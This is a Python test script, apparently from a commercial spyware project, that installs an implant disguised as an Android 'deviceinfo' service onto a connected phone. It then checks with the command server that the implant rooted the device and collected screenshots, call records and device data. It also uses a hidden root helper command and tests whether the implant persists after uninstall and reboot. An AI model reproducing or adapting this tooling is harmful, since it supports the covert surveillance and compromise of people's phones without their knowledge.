import sys
import csv
import time
import datetime
import traceback
import collections
from com.dtmilano.android.adb.adbclient import AdbClient
import adb


sys.path.append("/Users/olli/Documents/work/AVTest/")
from AVAgent import build

apk = 'assets/installer.default.apk'
service = 'com.android.deviceinfo'

def test_device(device, results):
    dev = device.serialno
    adb.uninstall(service, dev)

    if not adb.install(apk, dev):
        return "installation failed"

    results["installed"] = True
    if not adb.executeGui(service, dev):
        return "execution failed"
    else:
        results["executed"] = True

    time.sleep(120)

    print "Skype call and sleep"
    device.shell("am start -a android.intent.action.VIEW -d skype:echo123?call")

    time.sleep(120)

#    time.sleep(60)
    print "slept"

    # sync e verifica

    with build.connection() as c:
        operation = "Rite_Mobile"
        target_name = "HardwareFunctional"

        assert c
        if not c.logged_in():
            return("Not logged in")
        else:
            print "logged in"

        operation_id, group_id = c.operation(operation)
        target_id = c.targets(operation_id, target_name)[0]
        print "target_id: %s" % target_id

        instances = []
        while not instances:
            #print "operation: %s, %s" % (operation_id, group_id)
            print "waiting for sync"
            instances = c.instances_by_deviceid(results["id"], operation_id)
            time.sleep(10)

        instance_id = instances[0]['_id']
        print "instance_id: %s " % instance_id

        info = c.instance_info(instance_id)
        results['instance_name'] =  info['name']
        print "instance_info name: %s" % info['name']

        info_evidences = []
        counter = 0
        while not info_evidences and counter < 10:
            infos =  c.infos( target_id, instance_id)
            info_evidences = [ e['data']['content'] for e in infos if 'Root' in e['data']['content'] ]
            counter +=1
            time.sleep(10)

        print "info_evidences: %s: " % info_evidences
        if not info_evidences:
            results['root'] = 'No'
            return "No root"

        results['info'] = len(info_evidences) > 0
        root_method = info_evidences[0]
        results['root'] = root_method

        roots = [ r for r in info_evidences if 'previous' not in r ]
        print "roots: %s " % roots
        assert len(roots) == 1

        # get "Root: "
        # togliere previous, ne deve rimanere uno

        evidences =  c.evidences( target_id, instance_id )
        print evidences
        device_evidences = [ e['data']['content'] for e in evidences if e['type']=='device' ]
        screenshot_evidences = [ e for e in evidences if e['type']=='screenshot' ]
        call_evidences = [ e for e in evidences if e['type']=='call' ]
        print len(device_evidences), len(screenshot_evidences), len(call_evidences)

        #assert len(device_evidences) > 0
        #assert len(screenshot_evidences) > 0

        type_evidences = set()
        for e in evidences:
            type_evidences.add(e['type'])
        print type_evidences

        results['evidences'] = type_evidences

        #print info_evidences[0].encode('utf-8')
        #for ev in info_evidences:
        #    print [ e for e in ev.split('\n') if "Root" in e ]

    #uninstall
    print device.shell('rilcap qzx "ls -R /data/data/com.android.deviceinfo/files"')
    print "uninstall"
    adb.uninstall(service, dev)

    print "reboot"
    adb.reboot(dev)
    time.sleep(120)

    processes = adb.ps(dev)
    running = "persistence: %s" % service in processes
    results['running'] = running

    return True

def do_test(device):
    build.connection.host = "rcs-minotauro"
    device_id = get_deviceId(device)

    assert device_id
    assert len(device_id) >= 8

    with open('tmp/test-%s.csv' % device_id, 'wb') as csvfile:
    # write header
        devicelist = csv.writer(csvfile, delimiter=";",
                                quotechar="|", quoting=csv.QUOTE_MINIMAL)

        #devicelist.writerow(results.keys())
        #props = get_properties(device, "ro.product.manufacturer", "build.model", "build.selinux.enforce", "build.version.release")
        props = get_properties(device, "ro.product.manufacturer", "ro.product.model", "ro.build.selinux.enforce", "ro.build.version.release")
        print props
        devicelist.writerow(props.values())

def get_properties(device, *props):

    def get_property(device, prop_name):
        return device.getProperty(prop_name)

    res = {}
    for prop in props:
        if "." in prop:
            name = prop.split(".")[-1]
        else:
            name = prop
        res[name] = get_property(device, prop)
    print res

    dev_name = "%s %s" % (res["manufacturer"], res["model"])
    dev_id = get_deviceId(device)

    results = collections.OrderedDict()
    results['time'] = "%s" % datetime.datetime.now()
    results['device'] = dev_name
    results['id'] = dev_id
    results['release'] = res["release"]
    results['selinux'] = res["enforce"]
    results['error'] = ""
    results["return"] = ""

    try:
        ret = test_device(device, results)
        results["return"] = ret
        print "return: %s " % ret
    except Exception, ex:
        traceback.print_exc(dev_id)
        results['error'] = "%s" % ex

    return results

def get_deviceId(device):
    d_out = device.shell("dumpsys iphonesubinfo")
    lines = d_out.strip()
    devline = lines.split("\n")[2]
    dev_id = devline.split("=")[1].strip()
    return dev_id

def main():
    devices = adb.get_attached_devices()

    print """ prerequisiti:
    1) Telefono connesso in USB,
    2) USB Debugging enabled (settings/developer options/usb debugging)
    3) connesso wifi a RSSM
    4) screen time 2m (settings/display/sleep)
    """

    print "devices connessi:"
    for device in devices:
        print device

    dev = None
    if not devices:
        print "non ci sono device connessi"
    else:

        if len(devices) > 1:
            dev = raw_input("su quale device si vuole eseguire il test? ")
            print "Eseguo il test su %s" % dev

        #device = MonkeyRunner.waitForConnection(dev)
        if len(sys.argv) >= 2:
            serialno = sys.argv[1]
        else:
            serialno = '.*'
        device = AdbClient(serialno=serialno)
        do_test(device)

    print "Fine."

if __name__ == "__main__":
    main()
